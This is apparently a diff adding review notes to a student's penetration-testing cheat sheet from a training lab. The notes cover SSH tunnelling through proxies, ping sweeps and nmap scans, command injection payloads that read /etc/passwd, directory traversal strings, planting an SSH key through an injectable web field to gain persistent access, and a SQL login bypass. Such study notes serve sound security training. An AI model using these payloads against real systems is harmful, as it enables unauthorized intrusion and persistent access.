@@ -772,4 +772,69 @@ priv 1 enumerate -
 
 ##################################### DRY RUN##########################################################
 
+
+################################## REVIEW #############################################
+CONROL SOCKETS
+  ssh -MS /tmp/demo demo1@10.50.15.172                                           -create master socket
+  ssh -S /tmp/demo demo -O forward -D9050                                        -create a dynamic tunnel from the socket demo.
+  ssh -S /tmp/demo demo -O forward -L1111:10.208.50.42:22 -L1112:10.208.50.422:80  - creating a local port forward
+  ssh -S /tmp/demo demo -O cancel -L1112:10.20.50.422:80                           - to cancel a socket 
+  
+NET RECON 
+  cat /etc/hosts, /usr/share
+  for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done     -This is a Ping Sweep for ips  REMEMBER TO TAKE NOTES ON EACH IP.
+PORT SCAN
+  Proxychains nmap <ip>                                                             -notes the open port from the specific ip
+  proxychains nmap --script=http-enum <ip>                                          -then you get a list of directories  CHECK THEM ON FIREFOX. on firefox you can duplicate the web  
+  
+WEBSITE ENUMERATION
+COMMAND INJECTION
+    ;WHOAMI
+    ;CAT /ETC/PASSWD
+    ;CAT /ETC/HOSTS
+DIRECTORY TRAVERSAL
+  Vulnerable field reads file and is not ulnerable to cmdinjection
+  ../../../../../../../../etc/passwd
+  ../../../../../../../../etc/hosts
+SSH KEYGEN
+1  make .ssh directoryin the users home directory
+    ; mkdir /var/www/.ssh
+    ; ls -la /var/wwww        verity the directory have been made
+
+2 upload your key FROM LINOPS
+  cat $HOME/.ssh/id_rsa.pub 
+  copy the whole key from "ssh-rsa" to "student@lin-ops"
+
+3 in vulnerable field
+  ; echo "" > /var/www/.ssh/authorized keys
+  ; cat /var/www/.ssh/authorized_keys
+SQL!!!
+  Login screen? AUTHENTICATION BYPASS 
+  username:   ' OR 1='1
+  password:   ' OR 1='1
+go to inspect > networck > post > request > raw (radio button)   view page source to make it look better.   GET METHOD
+add a "?" and copy paste back into URL       -Example: x.x.x.x/login.php? <paste>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
                                                
